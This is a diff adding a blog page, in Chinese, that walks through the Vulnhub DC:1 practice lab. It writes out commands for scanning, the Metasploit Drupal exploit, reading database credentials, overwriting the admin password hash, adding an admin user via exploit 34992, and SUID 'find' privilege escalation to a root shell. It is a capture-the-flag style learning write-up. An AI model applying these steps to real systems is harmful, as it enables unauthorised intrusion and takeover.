@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="环境配置首先环境配置，需要将靶机和kali设置为NAT模式   当前网段是192.168.100.0&#x2F;24  信息搜集nmap扫一下网段，主机探测 1nmap -sn 192.168.100.0&#x2F;24   192.168.100.134就是我们要打的靶机。全量扫描一下 1nmap -T4 -A 192.168.100.134   web指纹识别 1whatweb -v 192.168.100。13">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-DC:1">
+<meta property="og:url" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/index.html">
+<meta property="og:site_name" content="程序元的blog">
+<meta property="og:description" content="环境配置首先环境配置，需要将靶机和kali设置为NAT模式   当前网段是192.168.100.0&#x2F;24  信息搜集nmap扫一下网段，主机探测 1nmap -sn 192.168.100.0&#x2F;24   192.168.100.134就是我们要打的靶机。全量扫描一下 1nmap -T4 -A 192.168.100.134   web指纹识别 1whatweb -v 192.168.100。13">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602162211135.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602162509753.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602162729704.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602175838661.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602181253499.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602195757083.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602200629339.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602200838777.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602201740224.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602202158816.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602204234798.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602204718382.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602204847680.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602205324417.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602210424676.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602211326413.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602212018008.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602212448520.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260603145630002.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260603145824868.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260603150155335.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260603150218340.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602212728464.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602212930674.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602213809484.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602214115223.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602214201642.png">
+<meta property="article:published_time" content="2026-06-02T06:46:29.000Z">
+<meta property="article:modified_time" content="2026-06-04T04:43:29.354Z">
+<meta property="article:author" content="程序元">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/image-20260602162211135.png">
+
+<link rel="canonical" href="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulnhub-DC:1 | 程序元的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">程序元的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/06/02/Vulnhub-DC-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="程序元">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
+    </span>
+    
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="程序元的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-DC:1
+        </h1>
+    
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+    
+              <time title="创建时间：2026-06-02 14:46:29" itemprop="dateCreated datePublished" datetime="2026-06-02T14:46:29+08:00">2026-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-06-04 12:43:29" itemprop="dateModified" datetime="2026-06-04T12:43:29+08:00">2026-06-04</time>
+              </span>
+    
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+             <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>undefined 分钟</span>
+            </span>
+    
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    
+      
+        <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>首先环境配置，需要将靶机和kali设置为NAT模式</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602162211135.png" alt="image-20260602162211135"></p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602162509753.png" alt="image-20260602162509753"></p>
+<p>当前网段是<code>192.168.100.0/24</code> </p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>nmap扫一下网段，主机探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.100.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602162729704.png" alt="image-20260602162729704"></p>
+<p>192.168.100.134就是我们要打的靶机。全量扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A 192.168.100.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602175838661.png" alt="image-20260602175838661"></p>
+<p>web指纹识别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 192.168.100。134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602181253499.png" alt="image-20260602181253499"></p>
+<p>信息搜集如下：</p>
+<p>端口服务信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">22/tcp：ssh服务开启，版本：OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line"></span><br><span class="line">80/tcp：HTTP服务开启，版本：Apache httpd 2.2.22 ((Debian))</span><br><span class="line"></span><br><span class="line">111/tcp: rpcbind服务开启，版本：2-4 (RPC #100000)</span><br></pre></td></tr></table></figure>
+
+<p>web指纹信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Apache/2.2.22 (Debian)</span><br><span class="line"></span><br><span class="line">PHP 5.4.45</span><br><span class="line"></span><br><span class="line">CMS Drupal 7</span><br><span class="line"></span><br><span class="line">JQuery</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞利用关键在<code>CMS Drupal 7</code>，使用metasploit查找一下相关漏洞</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602195757083.png" alt="image-20260602195757083"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>填写攻击目标靶机的ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.100.134</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602200629339.png" alt="image-20260602200629339"></p>
+<p>看一下flag1.txt文件的内容</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602200838777.png" alt="image-20260602200838777"></p>
+<p>每个优秀的CMS都需要一个配置文件——你的也不例外。</p>
+<p>寻找一下配置文件，Drupal的核心配置文件时settings.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">find / -name settings.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602201740224.png" alt="image-20260602201740224"></p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602202158816.png" alt="image-20260602202158816"></p>
+<p>暴力破解和字典攻击并非获取访问权限的唯一途径（而且你肯定需要访问权限）。</p>
+<p>配置给出了数据库的配置信息先登入一下看看</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602204234798.png" alt="image-20260602204234798"></p>
+<p>这里直接连不行，meterpreter弹得时非交互式shell，修改为交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602204718382.png" alt="image-20260602204718382"></p>
+<p>连接数据库</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602204847680.png" alt="image-20260602204847680"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE drupaldb；</span><br><span class="line">show tables；</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602205324417.png" alt="image-20260602205324417"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users；</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602210424676.png" alt="image-20260602210424676"></p>
+<p>这里储存的密码时加密后的，接下来就是想办法获取或者修改admin用户的密码，或者新建admin用户。</p>
+<p>解法1：修改admin用户的密码</p>
+<p>搜索与密码有关的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *password*</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602211326413.png" alt="image-20260602211326413"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/php</span></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Drupal <span class="built_in">hash</span> script - to generate a <span class="built_in">hash</span> from a plaintext password</span><br><span class="line"> *</span><br><span class="line"> * Check <span class="keyword">for</span> your PHP interpreter - on Windows you<span class="string">&#x27;ll probably have to</span></span><br><span class="line"><span class="string"> * replace line 1 with</span></span><br><span class="line"><span class="string"> *   #!c:/program files/php/php.exe</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @param password1 [password2 [password3 ...]]</span></span><br><span class="line"><span class="string"> *  Plain-text passwords in quotes (or with spaces backslash escaped).</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (version_compare(PHP_VERSION, &quot;5.2.0&quot;, &quot;&lt;&quot;)) &#123;</span></span><br><span class="line"><span class="string">  $version  = PHP_VERSION;</span></span><br><span class="line"><span class="string">  echo &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ERROR: This script requires at least PHP version 5.2.0. You invoked it with</span></span><br><span class="line"><span class="string">       PHP version &#123;$version&#125;.</span></span><br><span class="line"><span class="string">\n</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="string">  exit;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$script = basename(array_shift($_SERVER[&#x27;</span>argv<span class="string">&#x27;]));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (in_array(&#x27;</span>--<span class="built_in">help</span><span class="string">&#x27;, $_SERVER[&#x27;</span>argv<span class="string">&#x27;]) || empty($_SERVER[&#x27;</span>argv<span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">  echo &lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Generate Drupal password hashes from the shell.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:        &#123;$script&#125; [OPTIONS] &quot;&lt;plan-text password&gt;&quot;</span></span><br><span class="line"><span class="string">Example:      &#123;$script&#125; &quot;mynewpassword&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">All arguments are long options.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --help      Print this page.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --root &lt;path&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              Set the working directory for the script to the specified path.</span></span><br><span class="line"><span class="string">              To execute this script this has to be the root directory of your</span></span><br><span class="line"><span class="string">              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal</span></span><br><span class="line"><span class="string">              running on Unix). Use surrounding quotation marks on Windows.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &quot;&lt;password1&gt;&quot; [&quot;&lt;password2&gt;&quot; [&quot;&lt;password3&gt;&quot; ...]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              One or more plan-text passwords enclosed by double quotes. The</span></span><br><span class="line"><span class="string">              output hash may be manually entered into the &#123;users&#125;.pass field to</span></span><br><span class="line"><span class="string">              change a password via SQL to a known value.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To run this script without the --root argument invoke it from the root directory</span></span><br><span class="line"><span class="string">of your Drupal installation as</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  ./scripts/&#123;$script&#125;</span></span><br><span class="line"><span class="string">\n</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="string">  exit;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$passwords = array();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Parse invocation arguments.</span></span><br><span class="line"><span class="string">while ($param = array_shift($_SERVER[&#x27;</span>argv<span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">  switch ($param) &#123;</span></span><br><span class="line"><span class="string">    case &#x27;</span>--root<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">      // Change the working directory.</span></span><br><span class="line"><span class="string">      $path = array_shift($_SERVER[&#x27;</span>argv<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">      if (is_dir($path)) &#123;</span></span><br><span class="line"><span class="string">        chdir($path);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      break;</span></span><br><span class="line"><span class="string">    default:</span></span><br><span class="line"><span class="string">      // Add a password to the list to be processed.</span></span><br><span class="line"><span class="string">      $passwords[] = $param;</span></span><br><span class="line"><span class="string">      break;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">define(&#x27;</span>DRUPAL_ROOT<span class="string">&#x27;, getcwd());</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">include_once DRUPAL_ROOT . &#x27;</span>/includes/password.inc<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">include_once DRUPAL_ROOT . &#x27;</span>/includes/bootstrap.inc<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach ($passwords as $password) &#123;</span></span><br><span class="line"><span class="string">  print(&quot;\npassword: $password \t\thash: &quot;. user_hash_password($password) .&quot;\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">print(&quot;\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>这时加密逻辑，根据这个脚本就可以把admin用户的密码修改</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602212018008.png" alt="image-20260602212018008"></p>
+<p>$S$DZXhDAifDn72xnWf4kocKQlxBEttPRs1bLWMDPISHzAIjdlgvfyB</p>
+<p>修改admin的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&quot;$S$DZXhDAifDn72xnWf4kocKQlxBEttPRs1bLWMDPISHzAIjdlgvfyB&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>访问192.168.100.134,admin&#x2F;123456登入找到flag3</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602212448520.png" alt="image-20260602212448520"></p>
+<p>解法2：添加admin权限用户</p>
+<p>使用searchsploit查找一下drupal的漏洞</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260603145630002.png" alt="image-20260603145630002"></p>
+<p>下载下来</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260603145824868.png" alt="image-20260603145824868"></p>
+<p>使用方法：<code>python2 34992.py -t http://目标IP -u 你要的账号 -p 你要的密码</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 34992.py -t http://192.168.100.134 -u abc -p 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260603150155335.png" alt="image-20260603150155335"></p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260603150218340.png" alt="image-20260603150218340"></p>
+<p>登入成功。</p>
+<p>特殊权限可以帮助找到 passwd - 但你需要执行该命令才能弄清楚如何获取隐藏的内容</p>
+<p>很明显需要提取，先看一下&#x2F;etc&#x2F;passwd</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602212728464.png" alt="image-20260602212728464"></p>
+<p>查看&#x2F;home&#x2F;flag4的文件的内容</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602212930674.png" alt="image-20260602212930674"></p>
+<p>下一步就考虑提取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602213809484.png" alt="image-20260602213809484"></p>
+<p>使用find命令提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602214115223.png" alt="image-20260602214115223"></p>
+<p>提权成功在root目录得到flag</p>
+<p><img src="/2026/06/02/Vulnhub-DC-1/image-20260602214201642.png" alt="image-20260602214201642"></p>
+
+    </div>
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+          </div>
+    
+        
+
+    
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/05/11/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="Fastjson反序列化漏洞">
+      <i class="fa fa-chevron-left"></i> Fastjson反序列化漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/06/03/Vulnhub-DC-2/" rel="next" title="Vulnhub-DC:2">
+      Vulnhub-DC:2 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
